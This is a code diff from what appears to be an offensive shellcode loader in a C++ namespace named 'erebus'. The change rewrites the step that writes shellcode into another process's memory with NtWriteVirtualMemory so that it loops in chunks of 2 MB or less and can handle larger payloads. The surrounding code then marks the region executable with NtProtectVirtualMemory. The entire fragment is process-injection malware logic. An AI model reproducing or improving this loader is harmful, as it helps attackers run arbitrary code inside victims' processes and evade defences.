@@ -82,20 +82,34 @@ namespace erebus {
 		}
 		LOG_SUCCESS("Address Pointer: 0x%p", base_address);
 
-		status = NtWriteVirtualMemory(process_handle, base_address, (PVOID)shellcode, shellcode_size, &bytes_written);
-		if (!NT_SUCCESS(status))
+		// Write in chunks to support large shellcode sizes (>2MB)
+		const SIZE_T max_chunk = 0x200000; // 2MB
+		SIZE_T total_written = 0;
+		SIZE_T remaining = shellcode_size;
+		while (remaining > 0)
 		{
-			LOG_ERROR("Error writing shellcode to memory (NTSTATUS: 0x%08lX). (Wrote %zu/%zu bytes)", status, bytes_written, shellcode_size);
-			return NULL;
-		}
-		
-		if (bytes_written != shellcode_size)
-		{
-			LOG_ERROR("Incomplete write: wrote %zu/%zu bytes", bytes_written, shellcode_size);
-			return NULL;
+			SIZE_T chunk = (remaining > max_chunk) ? max_chunk : remaining;
+			SIZE_T chunk_written = 0;
+			PVOID write_address = (PBYTE)base_address + total_written;
+			PVOID write_buffer = (PBYTE)shellcode + total_written;
+
+			status = NtWriteVirtualMemory(process_handle, write_address, write_buffer, chunk, &chunk_written);
+			if (!NT_SUCCESS(status))
+			{
+				LOG_ERROR("Error writing shellcode chunk (NTSTATUS: 0x%08lX). (Wrote %zu/%zu bytes)", status, chunk_written, chunk);
+				return NULL;
+			}
+			if (chunk_written != chunk)
+			{
+				LOG_ERROR("Incomplete chunk write: wrote %zu/%zu bytes", chunk_written, chunk);
+				return NULL;
+			}
+
+			total_written += chunk_written;
+			remaining -= chunk_written;
 		}
 
-		LOG_SUCCESS("Shellcode written to memory (%zu bytes).", bytes_written);
+		LOG_SUCCESS("Shellcode written to memory (%zu bytes).", total_written);
 
 		status = NtProtectVirtualMemory(process_handle, &base_address, &allocation_size, PAGE_EXECUTE_READ, &old_protection);
 		if (!NT_SUCCESS(status))
